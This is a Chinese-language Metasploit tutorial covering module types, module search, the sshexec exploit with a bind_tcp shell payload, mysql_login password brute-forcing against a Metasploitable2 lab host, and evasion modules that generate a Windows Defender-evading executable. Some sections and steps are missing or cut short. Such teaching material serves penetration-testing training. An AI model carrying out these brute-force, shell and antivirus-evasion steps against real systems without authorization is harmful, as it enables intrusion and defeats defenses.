模块是指Metasploit框架中所使用的一段软件代码组件。Metasploit框架的核心就是由它支持的大量模块构成。并且，Metasploit将所有的模块进行了分类。Metasploit不仅自带了大量的模块，还支持导入第三方模块实施渗透。本文介绍Metasploit框架中各类模块的使用。


1、模块分类


Metasploit框架如此强大的核心所在，就是它支持的模块。其中，Metasploit将所有模块进行分类，分别是exploits、auxiliary、post、payloads、encoders和nops。这些模块类都以文件夹的形式保存在系统中，默认保存在Metasploit安装位置的modules目录下。在启动Metasploit时，可以看到每类模块的个数，具体如下：

以上显示了nops类的所有模块。这类模块数比较少，所以更容易看到。但是，如果模块数过多，一页无法显示完，可以使用search命令搜索特定模块，如通过类型、CVE编号等进行搜索。其中，search模块的语法格式如下：


search [关键字]


该命令可用的关键字如下：


app：指定client和server攻击的模块。

author：通过模块作者名称进行查找。

bid：根据Bugtraq ID来查询模块。

cve：根据CVE ID来查询模块。

edb：根据Exploit-DB ID来查询模块。

name：根据名称来查询模块。

osvdb：根据OSVDB ID来查询模块。

platform：根据模块级别来查询，缩小查询范围。

ref：根据ref来查询模块。

type：根据类型来查询模块。如类型为exploit、auxiliary或post。

msf5 > search MS08-067

2、渗透攻击模块（Exploit）


渗透攻击模块用于实际发起渗透攻击的模块组件。可以使用以下命令查看所有渗透攻击模块：


msf5 > show exploit


在输出的结果中，对每个模块的发布时间及含义都有详细介绍。由于可利用的渗透攻击模块比较多，所以这里就不一一列举了。下面介绍渗透攻击模块的使用。


使用multi/ssh/sshexec模块对目标主机（Metasploitable2）实施渗透攻击。具体操作步骤如下：


1）搜索multi/ssh/sshexec模块的全路径。执行命令如下：


msf5 exploit(mssql_payload) > search sshexec

3、辅助模块（Auxiliary）


辅助模块主要用来执行一些诸如扫描或系统查询的攻击动作。辅助模块除了提供一些实用的侦查工具外，如端口扫描器、服务指纹截取器等，还包含类似mysql_login的工具，它能够使用一个用户名和口令列表对整个网络上的MySQL服务进行暴力口令破解。此外还有一些协议Fuzz测试工具，如ftp_pre_post、http_get_uri_long、ssh_version_corrupt等。渗透测试者可以对一些特定的目标服务执行这些Fuzz测试器，并很有可能会有一些意外收获。下面介绍辅助模块的使用。


同样，可以使用show auxiliary命令查看所有辅助模块。Metasploit的辅助模块和渗透攻击模块的使用类似，只需要简单地输入use命令并跟上模块名字即可。例如，使用webdav_scanner模块，则输入命令如下：


msf5 > use auxiliary/scanner/http/webdav_scanner


在辅助模块中，一些基本参数同其他模块有一些细微差别。例如，RHOST参数主要用于定位多个目标主机，THREAD参数用来微调扫描速度等。


利用mysql_login模块对目标主机（Metasploitable2）的MySQL数据库服务进行暴力破解。具体操作步骤如下：


1）搜索mysql_login模块的全路径。执行命令如下：

msf5 auxiliary(mysql_login) > set RHOSTS 192.168.1.102

以上信息设置了目标系统的地址，用户文件和密码文件的路径。其中，这里的RHOSTS参数可以设置为IP地址、IP地址列表、IP地址段或CIDR地址块。


在以上命令中，usernames.txt和passwords.txt文件不是默认保存在系统中的。这里指定的用户名和密码文件是手动创建的，并且被保存到/root目录中。

5、攻击载荷（Payloads）


攻击载荷是指用户希望对目标系统攻击成功之后去执行的代码。例如，创建一个Meterpreter连接或者通过绑定到一个监听端口，来获取Shell交互。也可以利用攻击载荷在目标操作系统上执行一些命令，如添加账号等。下面介绍攻击载荷的使用。


使用linux/x86/shell/bind_tcp攻击载荷来取得一个Shell交互。具体操作步骤如下：


1）攻击载荷是渗透攻击成功后执行的代码。所以，如果要使用攻击载荷，需要先选择一个渗透攻击模块才可以。下面仍然使用multi/ssh/sshexec渗透攻击模块。当实施攻击成功后，通过linux/x86/shell/bind_tcp攻击载荷来获得与目标主机的Shell交互。选择渗透攻击模块，如下所示：


msf5 > use exploit/multi/ssh/sshexec


2）加载攻击载荷。执行命令如下：


msf5 exploit(sshexec) > set payload linux/x86/shell/bind_tcp

payload => linux/x86/shell/bind_tcp


3）查看模块的配置选项参数。执行命令如下：


msf5 exploit(sshexec) > show options

4）配置选项参数。执行命令如下：

6、nops模块


NOP（No Operation or Next Operation）sled，由于IDS/IPS会检查数据包中不符合规则的数据，所以在某些场合下（比如针对溢出攻击），某些特殊的字符串（NOPS\x90\x90...）会因为被拦截而导致攻击失效，此时需要修改exploit中的NOPs。nops文件夹下的内容会在Payload（攻击载荷）生成时用到。例如，这里将打开PHP的NOPs生成脚本，会发现它只是返回了指定长度的空格而已，如图1所示。

8、插件（Plugins）


Metasploit不仅提供了大量的模块，而且还支持一些插件的使用，如Nessus、OpenVAS、wmap等。下面介绍Metasploit中插件的使用方法。


在Metasploit的命令行终端（MSF）下运行load命令，即可查看加载插件的方法。具体如下：


msf5 > load

Usage: load <option> [var=val var=val ...]

Loads a plugin from the supplied path.

For a list of built-in plugins, do: load -l

For a list of loaded plugins, do: load -s

The optional var=val options are custom parameters that can be passed to plugins.


从输出的信息中可以看到加载插件的语法格式。这些插件都是一些可执行的Ruby脚本，默认保存在/usr/share/metasploit-framework/plugins下。还可以自己创建插件，或者从第三方获取，然后将这些插件脚本文件复制到/root/.msf4/plugins目录中，之后重新启动Metasploit即可使用新导入的插件。其中，Metasploit默认提供的一些插件如表3所示。

表3  默认插件


在加载插件之前，可以使用load-s命令查看其插件是否已经加载。如果已经加载的话，则不需要加载。如果没有加载，则使用load命令加载。执行命令如下：


msf5 > load -s Nessus


从输出的信息中可以看到，当前已经加载了Nessus插件。

9、规避模块（Evasion）


规避模块是在Metasploit 5中新增加的。可以使用规避模块来规避Windows Defender防火墙。Windows Defender是Windows系统自带的防火墙工具。它不仅可以扫描系统，还可以对系统进行实时监控。


当用户使用Metasploit实施渗透测试时，通过使用规避模块可以规避Windows Defender程序查杀。下面介绍这两个规避模块。


使用windows/windows_defender_exe规避模块，生成一个Windows EXE文件来规避Windows Defender程序。具体操作步骤如下：


1）查看规避模块。执行命令如下：


msf5 > show evasion

evasion

=======

Name          Disclosure   Date    Rank    Check     Description

------       ----------   -----   -----   ------    -------------

windows/windows_defender_exe normal No Microsoft Windows Defender Evasive Executable

windows/windows_defender_js_h normal No Microsoft Windows Defender Evasive JS.Net and HTA


从输出的信息可以看到，有两个规避模块，即windows/windows_defender_exe和windows/windows_defender_js_hta。其中，windows/windows_defender_exe模块用来生成一个Windows EXE文件；windows/windows_defender_exe模块可以在目标主机上生成一个HTA文件和一个包括shellcode的JScript.NET文件。


2）加载windows/windows_defender_exe模块，并查看其配置选项。执行命令如下：


msf5 > use windows/windows_defender_exe

msf5 evasion(windows/windows_defender_exe) > show options

Module options (evasion/windows/windows_defender_exe):

Name      Current Setting     Required   Description

(default: random)

从输出的信息可以看到，该模块只有一个配置参数FILENAME，用来设置生成的规避文件名。默认情况下，随机生成一个文件。其中，当前的设置为MaqoKqwmIY.exe。


3）生成一个规避文件。执行命令如下：


msf5 evasion(windows/windows_defender_exe) > run

[*] Compiled executable size: 4096

[+] MaqoKqwmIY.exe stored at /root/.msf4/local/MaqoKqwmIY.exe


从输出的信息可以看到，成功生成了规避文件MaqoKqwmIY.exe。该文件默认保存在/root/.msf4/local/目录中。
